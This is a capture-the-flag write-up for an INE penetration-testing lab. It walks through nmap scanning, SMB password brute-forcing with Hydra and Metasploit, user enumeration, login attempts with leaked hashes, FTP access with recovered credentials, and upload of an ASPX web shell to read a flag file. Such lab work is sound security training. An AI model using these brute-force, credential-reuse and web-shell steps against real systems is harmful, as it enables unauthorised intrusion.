## Host & Network Penetration Testing: Exploitation CTF 2

### Flag 1: Looks like smb user tom has not changed his password from a very long time.

Using Nmap we find some useful ports open.
```
nmap target.ine.local -sS -T4 -p21,80,135,139,445,3389 -sV
```
Following the track hint, we begin to enumerate port 445.
```
nmap target.ine.local -sS -T4 -p445 -sV -sC
```
We are not able to discover anything useful, so we try a brute force  attack against SMB port with Hydra.
```
hydra -l tom -P /usr/share/wordlists/metasploit/unix_passwords.txt target.ine.local smb
```
Hydra presents an error. Upon online research, it appears that this issue may be caused by an incorrect communication dialect that can be changed with the -m flag. However, this does not provide further clarification.

We try with the Metasploit module "smb_login". Configuring it the same way as Hydra and launching it gives us the password fo the user tom.
```
tom:felipe
```
We list shared folders:
```
smbclient -L target.ine.local -U tom
```
```
ADMIN$
C$
D$
HRDocuments
ITResources
```
We try to connect to the fourth one in which we find the first flag:
```
smbclient //target.ine.local/HRDocuments -U tom 
```

### Flag 2: Using the NTLM hash list discovered in the previous challenge, can you compromise the smb user nancy?

We can locate the leaked_hashes.txt file in the same directory as the flag1.txt file.

Utilizing the tom credential, we enumerate other users with the Metasploit module smb_enumusers.
```
Administrator
david
nancy
sum-user
tom
```
After some research, we have identified the most effective approach to proceed, which involves utilising the Metasploit module smb_login in conjunction with the password file "leaked_hashes.txt".
```
set CreateSession true
set SMBUser nancy
set PASS_file leaked-hashes.txt
run
```
Enumerating the ITResources share, we discover the second flag and an hint for the next flag.
```
david:omnitrix_9901
```

### Flag 3: I wonder what the hint found in the previous challenge be useful for!

The credentials obtained in the previous step are useless for the SMB protocol, as we can observe thanks to SMBMap.
```
smbmap -H target.ine.local -u david -p omnitrix_9901
```
Using these credentials and the FTP protocol, we successfully gained access and retrieved the third flag.
```
ftp target.ine.local
```

### Flag 4: Can you compromise the target machine and retrieve the C://flag4.txt file?

Having access to the root folder of the site located on port 80, “target.ine.local:80”, we can upload a web shell.
We have only one option:
```
/usr/share/webshells/aspx/cmdasp.aspx
```
After uploading the shell, we use Firefox to exploit the site http://target.ine.local/cdmasp.aspx. Using the track hint, we type the following command to obtain the last flag:
```
type c:\flag4.txt
```
